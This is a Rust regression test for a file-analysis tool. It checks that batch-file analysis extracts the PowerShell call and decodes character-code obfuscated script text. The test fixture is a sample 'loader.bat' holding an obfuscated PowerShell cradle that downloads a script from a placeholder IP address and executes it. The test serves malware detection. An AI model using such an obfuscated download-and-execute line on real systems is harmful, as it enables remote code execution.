//! Regression coverage for Batch files that use filefacts-derived call symbols
//! and decoded script strings during normal analysis.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use cleave::{AnalysisOptions, analyze_file};

#[test]
fn batch_analysis_preserves_filefacts_symbols_and_decoded_text() -> anyhow::Result<()> {
    let dir = tempfile::tempdir()?;
    let path = dir.path().join("loader.bat");
    std::fs::write(
        &path,
        "@echo off\r\npowershell \"$lp=[char[]](38,32,40,91,83,99,114,105,112,116,66,108,111,99,107,93,58,58,67,114,101,97,116,101,40,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,50,48,51,46,48,46,49,49,51,46,49,48,47,115,116,46,116,120,116,39,41,41,41)-join'';iex($lp)\"\r\nexit\r\n",
    )?;

    let report = analyze_file(
        &path,
        &AnalysisOptions {
            disable_yara: true,
            ..AnalysisOptions::default()
        },
    )?;

    let view = report
        .filefacts
        .as_ref()
        .expect("batch analysis should attach filefacts view");

    assert!(
        view.symbols.iter().any(|symbol| matches!(
            symbol,
            filefacts::Symbol::Call {
                target: Some(target),
                ..
            } if target == "powershell"
        )),
        "batch filefacts symbols should include the PowerShell call target"
    );

    assert!(
        report.strings.iter().any(|row| {
            row.encoding_chain == ["script"]
                && row.value.contains("[ScriptBlock]::Create")
                && row.value.contains("Net.WebClient")
                && row.value.contains("DownloadString")
        }),
        "batch analysis should include decoded PowerShell char-code text as a script string"
    );

    Ok(())
}
